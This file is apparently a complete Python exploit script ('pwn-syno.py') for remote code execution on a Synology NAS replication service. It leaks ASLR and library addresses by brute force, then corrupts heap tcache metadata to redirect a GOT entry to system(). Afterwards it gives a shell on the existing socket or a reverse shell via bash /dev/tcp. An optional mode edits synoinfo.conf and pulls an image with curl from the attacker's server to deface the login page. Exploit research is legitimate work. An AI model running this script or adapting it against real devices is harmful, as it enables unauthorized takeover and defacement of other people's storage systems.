from pwn import *
context.arch="amd64"
from enum import IntEnum
from socket import htonl
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading

libc = ELF("libc.so.6", False)

if len(sys.argv) < 2:
    print("usage: python3 pwn-syno.py <victim-IP-address>")
    exit()
IP = sys.argv[1]
fd = 5
my_ip = None
if '-fd' in sys.argv:
    fd = int(sys.argv[sys.argv.index('-fd')+1])
if '-mip' in sys.argv:
    my_ip = sys.argv[sys.argv.index('-mip')+1]
if my_ip is None and ('-cb' in sys.argv or '-logo' in sys.argv):
    print("need -mip <my_ip> for connectback or logo version")
    exit()

def get_tube(dbg=False):
    global r
    r = remote(IP, 5566)
    return r

class Opcode(IntEnum):
    CMD_DSM_VER = 0x2258
    CMD_CLR_BKP = 0x2259
    CMD_SYNCSIZE = 0x2260
    CMD_STOP = 0x2261
    CMD_COUNT = 0x2262
    CMD_TEST_CONNECT = 0x2263
    CMD_SSL = 0x2264
    CMD_VERSION = 0x2265
    CMD_TOKEN = 0x2266
    CMD_NOP = 0x2267
    CMD_NAME = 0x2268
    CMD_SEND = 0x2269
    CMD_UPDATE = 0x226A
    CMD_END = 0x226B

def Hdr(op, sz, seq=0):
    return p32(htonl(op))+p32(htonl(seq))+p32(htonl(sz))
def Cmd(op, data=b"", sz=None, seq=0):
    if sz is None:
        sz = len(data)
    return Hdr(op, sz, seq)+data

def op(opcode, pl, sz=None):
    r.send(Cmd(opcode, pl, sz=sz))
def null(off):
    op(Opcode.CMD_NOP, b"", sz=off)

def brute_nibble():
    '''
    nulling the 2 lsbs of gSnapRecvPath char* is guaranteed to go in last ring buf
    in one of the 16 possible pages
    this function determines which of those pages it is, leaking the lowest ASLR'd nibble
    for each possible page:
        set a fake heap chunk size on that page
        trigger a free of nulled gSnapRecvPath
        if page matched, no abort, otherwise EOF
    the returned nibble is of the end page of the bss, where g_cmd g_token etc are
    '''
    with log.progress("nibble", level=logging.WARN) as progress:
        for nib in range(0x10):
            progress.status(str(nib))
            get_tube()
            # null 2 lsbs
            null(gSnapRecvPath - recvbuf)
            null(gSnapRecvPath+1 - (recvbuf+0x10000))
            # set lower version to survive CMD_NAME
            # also setup fake chunk in ring buf
            pl = b"%d"%0xff01
            pl = pl.ljust(0xf17,b'\0')
            pl += b'\0'*(0x1000*(0xf-nib))
            pl += p64(0x21)
            op(Opcode.CMD_VERSION, pl)
            # receive acks
            r.recvn(0xc*3)
            op(Opcode.CMD_NAME, b"A"*16)
            try:
                r.recvn(0xc)
                r.close()
                return nib
            except EOFError:
                pass
            r.close()
        progress.failure()
        raise Exception("couldnt brute nibble")

recvbuf = 0x7b0e1
gSnapRecvPath = 0xab180
g_token = 0xab1a0
libc_diff = 0x1f2000

context.log_level="warn"

if '-nib' in sys.argv:
    aslr_nib = int(sys.argv[sys.argv.index('-nib')+1], 0)
else:
    aslr_nib = brute_nibble()
log.warn("ASLR nibble: "+hex(aslr_nib<<12))
fakechunkoff = recvbuf+0x20000 + 0x1000*(0xf-aslr_nib)
fakechunkoff = (fakechunkoff+0xfff)&~0xfff
log.warn("fake chunk will be at "+hex(fakechunkoff))

def leak_into_json(byte):
    '''
    frees a fake chunk in recvbuf
    this populates the tcache next pointer with (addr>>12)
    this function writes out bytes [0,byte] as a token into the json file
    (addr>>12) will be 5 bytes, so we call this func 5 times to write each segment out
    '''
    get_tube()
    # point g_token into recvbuf
    null(g_token - recvbuf)
    null(g_token+1 - (recvbuf+0x10000))
    # setup fake chunk with some normally unused tcache size
    fakesz = b'\0'*0xf17 + b'\0'*(0x1000*(0xf-aslr_nib)) + p64(0x401)
    op(Opcode.CMD_NOP, fakesz)
    # point gSnapRecvPath into recvbuf (same spot as g_token)
    null(gSnapRecvPath - recvbuf)
    null(gSnapRecvPath+1 - (recvbuf+0x10000))
    # free gSnapRecvPath, tcache is empty
    # so value stored in fake chunk will be (addr>>12)^0
    op(Opcode.CMD_VERSION, b"%d"%0xff01)
    op(Opcode.CMD_NAME, b"A"*16)
    null(fakechunkoff+byte+1 - (recvbuf+0x10000))
    # write out g_token (pointing at tcache chunk) to json
    op(Opcode.CMD_VERSION, b"%d"%0xff03)
    op(Opcode.CMD_NAME, b"A")
    # recv acks
    r.recvn(0xc*10)
    r.close()

def get_leak():
    leak = 0
    for i in range(5):
        # leak segment into json
        leak_into_json(i)
        # brute force the next byte
        with log.progress("brute byte %d"%i, level=logging.WARN) as progress:
            for b in (range(1,256) if i!=0 else range(0x10,256,16)):
                stmsg = "0x%02x"%b+" ["+("="*(b//4)).ljust(64)+"]"
                progress.status(stmsg)
                # attempt to do initialization with token
                # if in json, error will be 3, else will be 0x20
                # note that once guessed correctly, other init code will error
                # and the token will be removed from the json file
                get_tube()
                op(Opcode.CMD_TOKEN, p64(leak)[:i]+p8(b))
                r.recvn(8)
                err = u32(r.recvn(4), endian="big")
                r.close()
                if err != 0x20:
                    leak |= b<<(i*8)
                    progress.success(stmsg)
                    break
        log.warn("cur leak: "+hex(leak))
    return leak
if '-leak' in sys.argv:
    leak = int(sys.argv[sys.argv.index('-leak')+1], 0)
else:
    leak = get_leak()
fakechunk = leak<<12
log.warn("fakechunk: "+hex(fakechunk))
libreplica = fakechunk-fakechunkoff
log.warn("lib base: "+hex(libreplica))
libc.address = libreplica-libc_diff
log.warn("libc: "+hex(libc.address))

context.log_level = "info"

def exploit(cmd):
    get_tube()
    # setup fake chunk and free
    # size needs to have at least one entry already in tcache
    null(gSnapRecvPath - recvbuf)
    null(gSnapRecvPath+1 - (recvbuf+0x10000))
    fakesz = b'\0'*0xf17 + b'\0'*(0x1000*(0xf-aslr_nib)) + p64(0x51)
    op(Opcode.CMD_NOP, fakesz)
    # free it
    op(Opcode.CMD_VERSION, b"%d"%0xff01)
    op(Opcode.CMD_NAME, b"A"*16)
    # trash tcache next to point before GOT of operator delete
    pl = fakesz
    pl += p64((libreplica+0x7a788-0x38) ^ (fakechunk>>12))
    op(Opcode.CMD_NOP, pl)
    r.recvn(0xc*6)
    # overwrite operator delete and trigger system
    # reuse existing socket for shell
    # (real device has extra fd, guessing its syslog socket)
    pl = cmd
    pl = pl.ljust(0x38,b' ')+p64(libc.symbols["system"])
    op(Opcode.CMD_TOKEN, pl)
def logo():
    server = HTTPServer(("0", 8000), SimpleHTTPRequestHandler)
    thread = threading.Thread(target=lambda: server.serve_forever(), daemon=True)
    thread.start()
    def sed(key, value):
        r.sendline(f"(grep -q {key} synoinfo.conf && sed -i -e 's/{key}=.*/{key}=\"{value}\"/' synoinfo.conf) || echo {key}=\"{value}\" >> synoinfo.conf".encode())
    r.sendline(b"cd /etc")
    sed("login_logo_customize", "yes")
    sed("login_logo_position", "center")
    sed("login_logo_index", "1")
    sed("login_logo_ext", ".png")
    sed("login_logo_seq", "1")
    sed("login_welcome_title", "RET2 was here")
    r.sendline(b"cd /usr/syno/etc")
    r.sendline(f"curl -o login_logo.png {my_ip}:8000/logo.png".encode())

if '-cb' not in sys.argv:
    pl = b"sh >&%d 0>&%d 2>&%d;"%(fd, fd, fd)
    assert len(pl) <= 0x38, "len too large: "+hex(len(pl))
    exploit(pl)
else:
    l = listen(1337)
    pl = b"bash -i >& /dev/tcp/%s/1337 0>&1;"%my_ip.encode()
    assert len(pl) <= 0x38, "len too large: "+hex(len(pl))
    exploit(pl)
    l.wait_for_connection()
    r.close()
    r = l
if '-logo' in sys.argv:
    logo()
r.interactive()
